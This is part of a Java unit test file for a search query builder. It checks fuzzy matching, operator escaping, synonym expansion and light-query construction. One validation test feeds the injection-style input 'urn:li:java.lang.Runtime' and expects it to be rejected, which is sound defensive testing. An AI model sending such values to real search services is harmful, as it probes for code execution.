  public void testV3PhrasePrefixesExpandLessForSeveralTerms() {
    EntitySpec datasetSpec = operationContext.getEntityRegistry().getEntitySpec("dataset");
    // A single term keeps the default: for a word too short for fuzziness and the wildcard, the
    // prefix is its only partial match. "stg" also prefix-matches its synonym "staging"
    assertEquals(v3PhrasePrefixExpansions(datasetSpec, "stg"), Set.of(50));
    // Several terms take most of the clause budget
    assertEquals(v3PhrasePrefixExpansions(datasetSpec, "stg orders"), Set.of(10));
  }

  private Set<Integer> v3PhrasePrefixExpansions(EntitySpec spec, String query) {
    List<QueryBuilder> clauses = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(operationContext, List.of(spec), query, true), clauses);
    return clauses.stream()
        .filter(MatchPhrasePrefixQueryBuilder.class::isInstance)
        .map(prefix -> ((MatchPhrasePrefixQueryBuilder) prefix).maxExpansions())
        .collect(Collectors.toSet());
  }

  private List<SimpleQueryStringBuilder> v3SimpleQueries(EntitySpec spec, String query) {
    List<QueryBuilder> clauses = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(operationContext, List.of(spec), query, true), clauses);
    return clauses.stream()
        .filter(SimpleQueryStringBuilder.class::isInstance)
        .map(SimpleQueryStringBuilder.class::cast)
        .collect(Collectors.toList());
  }

  private long v3SimpleQueryCount(String query) {
    List<QueryBuilder> clauses = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(
            opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), query, true),
        clauses);
    return clauses.stream().filter(SimpleQueryStringBuilder.class::isInstance).count();
  }

  @Test(expectedExceptions = ValidationException.class)
  public void testV3ValidatesUrnQueries() {
    // Urn queries skip the general query, so validation must run before the dispatch
    TEST_V3_BUILDER.buildQuery(
        opContext,
        ImmutableList.of(TestEntitySpecBuilder.getSpec()),
        "urn:li:java.lang.Runtime",
        true);
  }

  @Test
  public void testV3StructuredQuery() {
    QueryBuilder query =
        ((FunctionScoreQueryBuilder)
                TEST_V3_BUILDER.buildQuery(
                    opContext,
                    ImmutableList.of(TestEntitySpecBuilder.getSpec()),
                    STRUCTURED_QUERY_PREFIX + "keyPart1:value",
                    true))
            .query();
    DisMaxQueryBuilder disMax = (DisMaxQueryBuilder) query;
    QueryStringQueryBuilder structured = (QueryStringQueryBuilder) disMax.innerQueries().get(0);
    assertEquals(structured.queryString(), "keyPart1:value");
    assertEquals(structured.fields().get("keyPart1").floatValue(), 10.0f);
  }

  @Test
  public void testV3QuotedQueryRunsNoFuzzyMatch() {
    List<QueryBuilder> clauses = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(
            opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), "\"test query\"", true),
        clauses);
    assertTrue(
        clauses.stream()
            .filter(SimpleQueryStringBuilder.class::isInstance)
            .map(SimpleQueryStringBuilder.class::cast)
            .noneMatch(sqs -> sqs.value().contains("~")),
        clauses.toString());
    // Nor a substring match of a quoted word
    List<QueryBuilder> quotedWord = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(
            opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), "\"testQuery\"", true),
        quotedWord);
    assertTrue(quotedWord.stream().noneMatch(WildcardQueryBuilder.class::isInstance));
  }

  @Test
  public void testSplitAlphanumericTokens() {
    assertEquals(SearchQueryBuilder.splitAlphanumericTokens("hello"), "hello");
    assertEquals(SearchQueryBuilder.splitAlphanumericTokens("2017"), "2017");
    assertEquals(SearchQueryBuilder.splitAlphanumericTokens("orders2017"), "orders 2017");
    assertEquals(SearchQueryBuilder.splitAlphanumericTokens("2023table"), "2023 table");
    assertEquals(SearchQueryBuilder.splitAlphanumericTokens("abc123def"), "abc 123 def");
    assertEquals(
        SearchQueryBuilder.splitAlphanumericTokens("hello table2023 world"),
        "hello table 2023 world");
    assertEquals(SearchQueryBuilder.splitAlphanumericTokens(""), "");
  }

  @Test
  public void testEscapeSimpleQueryStringOperators() {
    // Hyphen replaced with space (prevents NOT operator)
    assertEquals(
        SearchQueryBuilder.escapeSimpleQueryStringOperators("user-interaction"),
        "user interaction");
    assertEquals(SearchQueryBuilder.escapeSimpleQueryStringOperators("user~5"), "user 5");
    assertEquals(SearchQueryBuilder.escapeSimpleQueryStringOperators("(user)"), " user ");
    assertEquals(SearchQueryBuilder.escapeSimpleQueryStringOperators("pre*"), "pre ");
    // Bare "*" preserved for browse-all, double quotes for phrase matching
    assertEquals(SearchQueryBuilder.escapeSimpleQueryStringOperators(" * "), " * ");
    assertEquals(
        SearchQueryBuilder.escapeSimpleQueryStringOperators("\"exact phrase\""),
        "\"exact phrase\"");
  }

  @Test
  public void testMakeFuzzyQuery() {
    // Up to 4 characters: no fuzzy, short acronyms are too easily corrupted
    assertEquals(SearchQueryBuilder.makeFuzzyQuery("etl"), "etl");
    assertEquals(SearchQueryBuilder.makeFuzzyQuery("gdpr"), "gdpr");
    // 5-6 characters: one edit; 7+: two
    assertEquals(SearchQueryBuilder.makeFuzzyQuery("alert"), "alert~1");
    assertEquals(SearchQueryBuilder.makeFuzzyQuery("revenue"), "revenue~2");
    // Each underscore or hyphen separated term gets its own distance
    assertEquals(SearchQueryBuilder.makeFuzzyQuery("user_facts"), "user facts~1");
    assertEquals(SearchQueryBuilder.makeFuzzyQuery("active-users"), "active~1 users~1");
  }

  @Test
  public void testV3LightQuerySkipsExpensiveClauses() {
    List<QueryBuilder> clauses = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(
            opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), "testQuery", true, true),
        clauses);
    assertTrue(clauses.stream().noneMatch(WildcardQueryBuilder.class::isInstance));
    assertTrue(clauses.stream().noneMatch(SimpleQueryStringBuilder.class::isInstance));
    // A single word searches the name-related delimited subfields only, here the urn
    MultiMatchQueryBuilder multiMatch =
        clauses.stream()
            .filter(MultiMatchQueryBuilder.class::isInstance)
            .map(MultiMatchQueryBuilder.class::cast)
            .findFirst()
            .orElseThrow();
    assertEquals(multiMatch.type(), MultiMatchQueryBuilder.Type.BEST_FIELDS);
    assertEquals(multiMatch.fields().keySet(), Set.of("urn.delimited"));
    // Exact names still score a constant above every partial match
    assertTrue(
        clauses.stream()
            .filter(TermQueryBuilder.class::isInstance)
            .map(TermQueryBuilder.class::cast)
            .anyMatch(term -> term.fieldName().equals("name.keyword") && term.boost() == 1000.0f));
  }

  @Test
  public void testV3LightQueryForKeywordsSearchesEveryField() {
    List<QueryBuilder> clauses = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(
            opContext,
            ImmutableList.of(TestEntitySpecBuilder.getSpec()),
            "test query words",
            true,
            true),
        clauses);
    Set<String> fields =
        clauses.stream()
            .filter(MultiMatchQueryBuilder.class::isInstance)
            .map(MultiMatchQueryBuilder.class::cast)
            .flatMap(multiMatch -> multiMatch.fields().keySet().stream())
            .collect(Collectors.toSet());
    assertTrue(fields.contains("textFieldOverride.delimited"), fields.toString());
    // Word grams need two or more words
    assertTrue(fields.contains("wordGramField.wordGrams2"), fields.toString());
  }

  @Test
  public void testV3LightQueryForDeepFqnRequiresEveryToken() {
    List<QueryBuilder> clauses = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(
            opContext,
            ImmutableList.of(TestEntitySpecBuilder.getSpec()),
            "my_db.sales.orders",
            true,
            true),
        clauses);
    assertTrue(
        clauses.stream()
            .filter(MultiMatchQueryBuilder.class::isInstance)
            .map(MultiMatchQueryBuilder.class::cast)
            .anyMatch(multiMatch -> multiMatch.operator() == Operator.AND),
        clauses.toString());
  }

  @Test
  public void testV3LightQueryExpandsSynonymsOfExactNames() {
    EntitySpec datasetSpec = operationContext.getEntityRegistry().getEntitySpec("dataset");
    List<QueryBuilder> clauses = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(operationContext, List.of(datasetSpec), "staging", true, true),
        clauses);
    assertTrue(
        clauses.stream()
            .filter(ConstantScoreQueryBuilder.class::isInstance)
            .map(cs -> (TermQueryBuilder) ((ConstantScoreQueryBuilder) cs).innerQuery())
            .anyMatch(
                term -> term.fieldName().equals("name.keyword") && "stg".equals(term.value())),
        clauses.toString());
  }

  @Test
  public void testV3LightQueryScoresOnlySameNameSynonymsAsExact() {
    // "athena" is a synonym of "glue" but a different name: no exact-name score, neither the
    // constant nor the synonym multi_match's exact-name terms
    List<QueryBuilder> glue = v3LightDatasetClauses("glue");
    assertEquals(exactNameConstants(glue), Set.of("glue"));
    assertTrue(
        glue.stream()
            .filter(TermQueryBuilder.class::isInstance)
            .map(TermQueryBuilder.class::cast)
            .noneMatch(term -> "athena".equals(term.value())),
        glue.toString());
    // A quoted query names a value, so it does not expand to its synonyms
    assertEquals(exactNameConstants(v3LightDatasetClauses("\"staging\"")), Set.of("staging"));
  }

  private List<QueryBuilder> v3LightDatasetClauses(String query) {
    List<QueryBuilder> clauses = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(
            operationContext,
            List.of(operationContext.getEntityRegistry().getEntitySpec("dataset")),
            query,
            true,
            true),
        clauses);
    return clauses;
  }

  @Test
  public void testV3LightQueryKeepsSplitWordsWhole() {
    // "cargo2017" splits into "cargo 2017": no multi_match takes a name holding only one part,
    // and the whole run is re-queried on the identity fields
    List<MultiMatchQueryBuilder> split = v3LightMultiMatches("cargo2017");
    assertEquals(split.size(), 1, split.toString());
    assertEquals(split.get(0).value(), "cargo2017");
    assertEquals(split.get(0).operator(), Operator.AND);
    // Escaping alone keeps matching any part, and re-queries the hyphenated identifier whole
    List<MultiMatchQueryBuilder> escaped = v3LightMultiMatches("load-job");
    assertTrue(
        escaped.stream().anyMatch(m -> "load job".equals(m.value()) && m.operator() == Operator.OR),
        escaped.toString());
    assertTrue(
        escaped.stream()
            .anyMatch(m -> "load-job".equals(m.value()) && m.operator() == Operator.AND),
        escaped.toString());
    // An unchanged word adds no re-query
    assertEquals(v3LightMultiMatches("cargo").size(), 1);
  }

  @Test
  public void testV3LightQueryRequeriesEveryNameField() {
    List<QueryBuilder> clauses = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(
            operationContext,
            List.of(
                operationContext.getEntityRegistry().getEntitySpec("dataset"),
                operationContext.getEntityRegistry().getEntitySpec("corpuser")),
            "cargo2017",
            true,
            true),
        clauses);
    Set<String> fields =
        clauses.stream()
            .filter(MultiMatchQueryBuilder.class::isInstance)
            .map(MultiMatchQueryBuilder.class::cast)
            .filter(multiMatch -> multiMatch.operator() == Operator.AND)
            .flatMap(multiMatch -> multiMatch.fields().keySet().stream())
            .collect(Collectors.toSet());
    assertTrue(
        fields.containsAll(
            Set.of("name.delimited", "qualifiedName.delimited", "displayName.delimited")),
        fields.toString());
  }

  @Test
  public void testV3LightQueryForLongExactNameRequiresEveryToken() {
    // Five parts make a long name, every part required; a leading delimiter adds no part
    assertTrue(
        v3LightMultiMatches("aa_bb_cc_dd_ee").stream()
            .anyMatch(multiMatch -> multiMatch.operator() == Operator.AND));
    assertTrue(
        v3LightMultiMatches("_aa_bb_cc_dd").stream()
            .noneMatch(multiMatch -> multiMatch.operator() == Operator.AND));
  }

  @Test
  public void testV3LightExactNameIsTheQueryAsTyped() {
    List<QueryBuilder> clauses = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(
            opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), "load-job", true, true),
        clauses);
    // Not "load job", which would make a name "Load Job" an exact match
    assertEquals(
        clauses.stream()
            .filter(TermQueryBuilder.class::isInstance)
            .map(TermQueryBuilder.class::cast)
            .filter(term -> term.fieldName().equals("name.keyword"))
            .map(TermQueryBuilder::value)
            .collect(Collectors.toSet()),
        Set.of("load-job"));
  }

  @Test
  public void testV3LightQueryCutsLongQueriesAtAWordBoundary() {
    // The light query matches the first 80 characters of a longer query, cut between words
    String query =
        "quarterly revenue forecast by region and product line for the north american sales team";
    List<MultiMatchQueryBuilder> multiMatches = v3LightMultiMatches(query);
    assertFalse(multiMatches.isEmpty());
    for (MultiMatchQueryBuilder multiMatch : multiMatches) {
      String value = String.valueOf(multiMatch.value());
      assertTrue(value.length() <= 80 && query.startsWith(value + " "), value);
    }
    // A word longer than that is cut at 80 characters
    assertTrue(
        v3LightMultiMatches("x".repeat(90)).stream()
            .allMatch(multiMatch -> String.valueOf(multiMatch.value()).equals("x".repeat(80))));
  }

  private List<MultiMatchQueryBuilder> v3LightMultiMatches(String query) {
    List<QueryBuilder> clauses = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(
            opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), query, true, true),
        clauses);
    return clauses.stream()
        .filter(MultiMatchQueryBuilder.class::isInstance)
        .map(MultiMatchQueryBuilder.class::cast)
        .collect(Collectors.toList());
  }

  @Test
  public void testV3LightQuerySearchesDocumentBodies() {
    EntitySpec documentSpec = operationContext.getEntityRegistry().getEntitySpec("document");
    List<QueryBuilder> clauses = new ArrayList<>();
    collectClauses(
        TEST_V3_BUILDER.buildQuery(
            operationContext, List.of(documentSpec), "quarterly revenue", true, true),
        clauses);
    assertTrue(
        clauses.stream()
            .filter(MultiMatchQueryBuilder.class::isInstance)
            .map(MultiMatchQueryBuilder.class::cast)
            .anyMatch(multiMatch -> multiMatch.fields().containsKey("text.delimited")),
        clauses.toString());
  }

  @Test
  public void testV2IgnoresLightQueryFlag() {
    QueryBuilder full =
        TEST_BUILDER.buildQuery(
            opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), "testQuery", true, false);
    QueryBuilder light =
        TEST_BUILDER.buildQuery(
            opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), "testQuery", true, true);
    assertEquals(light, full);
  }

  /** Collects every clause of a built query tree, descending into compound queries. */
  private static void collectClauses(QueryBuilder query, List<QueryBuilder> out) {
    out.add(query);
    List<QueryBuilder> children = new ArrayList<>();
    if (query instanceof FunctionScoreQueryBuilder) {
      children.add(((FunctionScoreQueryBuilder) query).query());
    } else if (query instanceof BoolQueryBuilder) {
      BoolQueryBuilder bool = (BoolQueryBuilder) query;
      children.addAll(bool.must());
      children.addAll(bool.should());
      children.addAll(bool.filter());
    } else if (query instanceof DisMaxQueryBuilder) {
      children.addAll(((DisMaxQueryBuilder) query).innerQueries());
    }
    children.forEach(child -> collectClauses(child, out));
  }
}
